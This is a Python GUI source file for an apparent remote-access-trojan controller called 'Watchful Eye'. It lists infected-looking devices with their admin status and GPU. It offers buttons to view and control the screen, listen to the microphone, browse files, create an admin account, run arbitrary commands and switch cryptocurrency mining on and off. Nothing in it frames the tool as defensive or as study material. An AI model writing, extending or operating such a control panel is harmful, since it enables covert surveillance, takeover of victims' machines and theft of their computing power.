import customtkinter as ctk
import asyncio
import threading
from utils.config import load_config
from utils.pi_client import pi_client


class DashboardApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Watchful Eye - Control Center")
        self.geometry("1200x800")
        self.minsize(800, 600)

        self.selected_device = None
        self.devices = []

        self._create_ui()
        self._load_devices()

    def _create_ui(self):
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self.sidebar = ctk.CTkFrame(self, width=250, corner_radius=0)
        self.sidebar.grid(row=0, column=0, sticky="nsew")

        self.sidebar_label = ctk.CTkLabel(self.sidebar, text="Watchful Eye",
                                           font=("Arial", 22, "bold"))
        self.sidebar_label.pack(pady=20, padx=10)

        self.refresh_btn = ctk.CTkButton(self.sidebar, text="Refresh Devices",
                                          command=self._load_devices)
        self.refresh_btn.pack(pady=10, padx=20, fill="x")

        self.devices_frame = ctk.CTkScrollableFrame(self.sidebar)
        self.devices_frame.pack(pady=10, padx=10, fill="both", expand=True)

        self.main_frame = ctk.CTkFrame(self)
        self.main_frame.grid(row=0, column=1, sticky="nsew", padx=10, pady=10)
        self.main_frame.grid_columnconfigure(0, weight=1)
        self.main_frame.grid_rowconfigure(1, weight=1)

        self.header_label = ctk.CTkLabel(self.main_frame, text="Select a device",
                                          font=("Arial", 20, "bold"))
        self.header_label.grid(row=0, column=0, pady=20, padx=20, sticky="w")

        self.content_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        self.content_frame.grid(row=1, column=0, sticky="nsew", padx=20, pady=10)

        self._show_welcome()

    def _show_welcome(self):
        for widget in self.content_frame.winfo_children():
            widget.destroy()

        ctk.CTkLabel(self.content_frame,
                      text="Welcome to Watchful Eye",
                      font=("Arial", 24, "bold")).pack(pady=50)
        ctk.CTkLabel(self.content_frame,
                      text="Select a device from the sidebar to get started",
                      font=("Arial", 14),
                      text_color="gray").pack(pady=10)

    def _load_devices(self):
        threading.Thread(target=self._async_load_devices, daemon=True).start()

    def _async_load_devices(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(pi_client.get_devices())
        self.devices = result.get("devices", [])
        self.after(0, self._render_devices)

    def _render_devices(self):
        for widget in self.devices_frame.winfo_children():
            widget.destroy()

        for device in self.devices:
            status_color = "green" if device.get("status") == "online" else "red"
            admin_badge = " [ADMIN]" if device.get("admin") else ""

            btn = ctk.CTkButton(
                self.devices_frame,
                text=f"{'●' if device.get('status') == 'online' else '○'} {device.get('hostname', 'Unknown')}{admin_badge}",
                anchor="w",
                fg_color="transparent",
                text_color=status_color,
                command=lambda d=device: self._select_device(d)
            )
            btn.pack(fill="x", pady=2, padx=5)

    def _select_device(self, device):
        self.selected_device = device
        self.header_label.configure(text=f"Device: {device.get('hostname', 'Unknown')}")
        self._show_device_controls()

    def _show_device_controls(self):
        for widget in self.content_frame.winfo_children():
            widget.destroy()

        device = self.selected_device
        is_online = device.get("status") == "online"

        info_frame = ctk.CTkFrame(self.content_frame)
        info_frame.pack(fill="x", pady=10)

        ctk.CTkLabel(info_frame, text=f"Hostname: {device.get('hostname')}",
                      font=("Arial", 12)).pack(pady=5, anchor="w", padx=10)
        ctk.CTkLabel(info_frame, text=f"IP: {device.get('ip')}",
                      font=("Arial", 12)).pack(pady=2, anchor="w", padx=10)
        ctk.CTkLabel(info_frame, text=f"OS: {device.get('os')}",
                      font=("Arial", 12)).pack(pady=2, anchor="w", padx=10)
        ctk.CTkLabel(info_frame, text=f"GPU: {device.get('gpu_name', 'None')}",
                      font=("Arial", 12)).pack(pady=2, anchor="w", padx=10)
        ctk.CTkLabel(info_frame, text=f"Admin: {'Yes' if device.get('admin') else 'No'}",
                      font=("Arial", 12),
                      text_color="green" if device.get("admin") else "red").pack(pady=2, anchor="w", padx=10)

        if is_online:
            controls_frame = ctk.CTkFrame(self.content_frame)
            controls_frame.pack(fill="x", pady=20)

            ctk.CTkLabel(controls_frame, text="Remote Controls",
                          font=("Arial", 16, "bold")).pack(pady=10)

            btn_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
            btn_frame.pack(pady=10, fill="x", padx=20)

            ctk.CTkButton(btn_frame, text="View & Control Screen",
                          command=self._open_screen_controller,
                          width=200, height=40).pack(side="left", padx=5)
            ctk.CTkButton(btn_frame, text="Listen to Microphone",
                          command=self._open_mic_viewer,
                          width=200, height=40).pack(side="left", padx=5)
            ctk.CTkButton(btn_frame, text="Browse Files",
                          command=self._open_file_manager,
                          width=200, height=40).pack(side="left", padx=5)
            ctk.CTkButton(btn_frame, text="Create Admin",
                          command=self._create_admin,
                          width=200, height=40,
                          fg_color="#28a745").pack(side="left", padx=5)

            cmd_frame = ctk.CTkFrame(self.content_frame)
            cmd_frame.pack(fill="x", pady=10)

            ctk.CTkLabel(cmd_frame, text="Run Command",
                          font=("Arial", 14, "bold")).pack(pady=10, anchor="w", padx=10)

            cmd_input_frame = ctk.CTkFrame(cmd_frame, fg_color="transparent")
            cmd_input_frame.pack(fill="x", padx=10, pady=5)

            self.cmd_entry = ctk.CTkEntry(cmd_input_frame, placeholder_text="Enter command...")
            self.cmd_entry.pack(side="left", fill="x", expand=True, padx=(0, 5))
            ctk.CTkButton(cmd_input_frame, text="Execute", width=100,
                          command=self._run_command).pack(side="right")

            self.cmd_output = ctk.CTkTextbox(cmd_frame, height=150)
            self.cmd_output.pack(fill="x", padx=10, pady=10)

            mining_frame = ctk.CTkFrame(self.content_frame)
            mining_frame.pack(fill="x", pady=10)

            ctk.CTkLabel(mining_frame, text="Mining Control",
                          font=("Arial", 14, "bold")).pack(pady=10, anchor="w", padx=10)

            mining_btn_frame = ctk.CTkFrame(mining_frame, fg_color="transparent")
            mining_btn_frame.pack(pady=5, fill="x", padx=10)

            ctk.CTkButton(mining_btn_frame, text="Enable Mining",
                          command=lambda: self._toggle_mining(True),
                          width=150, fg_color="#28a745").pack(side="left", padx=5)
            ctk.CTkButton(mining_btn_frame, text="Disable Mining",
                          command=lambda: self._toggle_mining(False),
                          width=150, fg_color="#dc3545").pack(side="left", padx=5)
        else:
            ctk.CTkLabel(self.content_frame,
                          text="Device is offline",
                          font=("Arial", 16),
                          text_color="red").pack(pady=50)

    def _open_screen_controller(self):
        from ui.screen_controller import ScreenController
        ScreenController(self, self.selected_device["id"],
                        self.selected_device["hostname"])

    def _open_mic_viewer(self):
        from ui.mic_viewer import MicrophoneViewer
        MicrophoneViewer(self, self.selected_device["id"],
                        self.selected_device["hostname"])

    def _open_file_manager(self):
        from ui.file_manager import FileManagerWindow
        FileManagerWindow(self, self.selected_device["id"],
                         self.selected_device["hostname"])

    def _create_admin(self):
        dialog = ctk.CTkInputDialog(text="Enter admin username:", title="Create Admin")
        username = dialog.get_input()
        if not username:
            return

        dialog = ctk.CTkInputDialog(text="Enter admin password:", title="Create Admin")
        password = dialog.get_input()
        if not password:
            return

        threading.Thread(
            target=self._async_create_admin,
            args=(username, password),
            daemon=True
        ).start()

    def _async_create_admin(self, username, password):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(
            pi_client.create_admin(self.selected_device["id"], username, password)
        )
        msg = result.get("result", {}).get("message", "Unknown result")
        self.after(0, lambda: self._show_message(f"Create Admin: {msg}"))

    def _run_command(self):
        command = self.cmd_entry.get()
        if not command:
            return

        threading.Thread(
            target=self._async_run_command,
            args=(command,),
            daemon=True
        ).start()

    def _async_run_command(self, command):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(
            pi_client.run_command(self.selected_device["id"], command)
        )
        output = result.get("result", {})
        if "stdout" in output:
            text = output["stdout"]
        elif "error" in output:
            text = output["error"]
        else:
            text = str(output)

        self.after(0, lambda t=text: self._update_cmd_output(t))

    def _update_cmd_output(self, text):
        self.cmd_output.configure(state="normal")
        self.cmd_output.delete("1.0", "end")
        self.cmd_output.insert("1.0", text)
        self.cmd_output.configure(state="disabled")

    def _toggle_mining(self, enabled):
        intensity = 50
        threading.Thread(
            target=self._async_toggle_mining,
            args=(enabled, intensity),
            daemon=True
        ).start()

    def _async_toggle_mining(self, enabled, intensity):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(
            pi_client.configure_mining(self.selected_device["id"], enabled, intensity)
        )
        msg = "Mining enabled" if enabled else "Mining disabled"
        self.after(0, lambda: self._show_message(msg))

    def _show_message(self, msg):
        dialog = ctk.CTkToplevel(self)
        dialog.title("Message")
        dialog.geometry("300x100")
        ctk.CTkLabel(dialog, text=msg, wraplength=250).pack(pady=20)
        ctk.CTkButton(dialog, text="OK", command=dialog.destroy).pack()
